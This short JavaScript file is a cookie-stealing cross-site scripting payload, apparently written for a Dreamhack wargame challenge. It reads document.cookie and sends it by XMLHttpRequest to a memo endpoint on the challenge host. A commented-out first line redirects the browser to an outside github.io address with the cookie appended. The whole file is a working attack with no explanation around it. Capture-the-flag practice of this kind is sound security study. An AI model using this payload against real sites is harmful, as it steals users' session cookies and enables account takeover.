// location.href="https://jaksdy.github.io?param="+document.cookie

var xmlHttp = new XMLHttpRequest();
var c = document.cookie;
var x = "http://host3.dreamhack.games:8108/memo?memo="+c;
xmlHttp.open('GET', x, true);
xmlHttp.send();
